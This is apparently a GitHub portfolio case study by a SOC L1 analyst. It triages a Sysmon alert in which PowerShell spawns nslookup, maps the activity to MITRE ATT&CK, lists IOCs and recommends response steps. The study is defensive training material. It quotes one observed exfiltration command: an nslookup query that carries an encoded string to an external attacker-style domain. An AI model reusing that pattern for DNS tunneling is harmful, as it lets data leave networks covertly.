🛡️ SOC L1 Incident Analysis – Suspicious Parent-Child Process (DNS Exfiltration)

📌 Overview

This repository documents the investigation of a high-severity security alert triggered by a suspicious parent-child process relationship detected via Sysmon logs. The activity indicates potential DNS-based data exfiltration using nslookup.exe executed through powershell.exe. 


![alert_details](https://github.com/user-attachments/assets/0d3a11df-3587-4eaf-9b2f-89bf4efde1cc)
![Incident response ](https://github.com/user-attachments/assets/3ed29793-c2c3-4c14-b66d-339230c7abe1)



🚨 Alert Summary
Field	Value
Event ID	1026
Alert Rule	Suspicious Parent-Child Relationship
Severity	High
Incident Type	Process
Host	win-3450
Detection Time	Feb 4th, 2026
🔍 Alert Details
Data Source: Sysmon
Event Code: 1 (Process Creation)
Process Name: nslookup.exe
Parent Process: powershell.exe
Process ID: 3952
Parent PID: 3728
Working Directory:
C:\Users\michael.ascot\downloads\exfiltration\
🧪 Command Line Observed
C:\Windows\System32\nslookup.exe 8AAAAAbAAAAQ2xpZW50U05GygdGZvbGlv.haz4rdw4re.io
⚠️ Key Observations
nslookup.exe is executed via powershell.exe, which is uncommon in standard user activity.
The queried domain contains a long encoded string, indicating possible data encoding within DNS queries.
Execution originates from a suspicious directory:
downloads\exfiltration\
Behavior strongly aligns with DNS tunneling or data exfiltration techniques.
🧠 Analysis

This alert was classified as a True Positive based on the following:

Use of PowerShell to spawn nslookup, a known technique for covert operations.
Presence of encoded payload in DNS query, suggesting data exfiltration.
Suspicious working directory explicitly named "exfiltration".
External domain communication with non-standard query patterns.
📊 MITRE ATT&CK Mapping
Tactic	Technique
Exfiltration	T1048 – Exfiltration Over Alternative Protocol
Command and Control	T1071.004 – Application Layer Protocol: DNS
Execution	T1059.001 – PowerShell
🚩 Indicators of Compromise (IOCs)
Execution of nslookup.exe via powershell.exe
Encoded DNS query string
Suspicious external domain:
*.haz4rdw4re.io
Unusual working directory (exfiltration)
🛠️ Recommended Actions
Immediate Response
⬆️ Escalate to L2 SOC Analyst
🚫 Block the identified domain at DNS/firewall level
👤 Notify the affected user
🔍 Investigate host activity and related logs
Further Investigation
Review PowerShell command history
Analyze DNS logs for similar queries
Check for persistence mechanisms
Perform endpoint threat hunting
📈 Lessons Learned
Monitoring parent-child process relationships is critical for detecting living-off-the-land attacks.
DNS traffic can be abused for covert data exfiltration.
Suspicious directory names can provide valuable context during triage.
✅ Final Verdict

Classification: True Positive
Escalation Required: Yes

This incident demonstrates a likely attempt at data exfiltration using DNS tunneling techniques, requiring further investigation and containment.

👨‍💻 Author

SOC L1 Analyst Case Study
(For learning and portfolio purposes)
